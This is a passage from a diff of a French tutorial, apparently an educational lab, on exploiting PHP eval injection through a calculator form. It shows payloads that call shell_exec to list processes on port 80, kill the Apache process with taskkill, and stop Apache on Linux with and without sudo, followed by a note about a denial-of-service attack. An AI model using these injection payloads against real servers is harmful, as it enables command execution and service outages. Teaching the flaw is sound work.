@@ -97,7 +97,7 @@ Voyons comment il est possible d'exécuter du code malveillant en exploitant l'*
   Grâce à la fonction présentée ci-dessus et au formulaire de la calculatrice, listez les processus qui écoutent le port du serveur Apache (généralement 80) grâce à la commande `netstat -ano | findstr :<numéro_de_port>`. Vous devriez trouver l'identifiant (**PID**) du processus ayant l'état **LISTENING** sur le port demandé.
 
   ```php
-  # Indice avec le port 80
+  # Example avec le port 80
   1; echo '<pre>' . shell_exec('netstat -ano | findstr :80') . '</pre>'
   ```
 
@@ -107,7 +107,17 @@ Voyons comment il est possible d'exécuter du code malveillant en exploitant l'*
   1; shell_exec('taskkill /PID identifiant_de_processus')
   ```
 
-:tada: Félicitations ! Vous venez d'effectuer une attaque **DDoS** sur le serveur.
+- Avec Linux
+
+    ```php
+    1; echo shell_exec('/etc/init.d/apache2 stop')
+    # ou
+    1; echo shell_exec('sudo /etc/init.d/apache2 stop')
+    # ou
+    1; echo shell_exec('sudo service apache2 stop')
+    ```
+
+:tada: Félicitations ! Vous venez d'effectuer une attaque **DoS** sur le serveur.
 
 Vous l'aurez compris, l'**injection eval** est extrêmement dangereuse et est l'entrée pour pléthores d'attaques informatiques. Les points qui ont été présentés ne sont qu'une infime partie des possibilités offertes par cette faille.
 
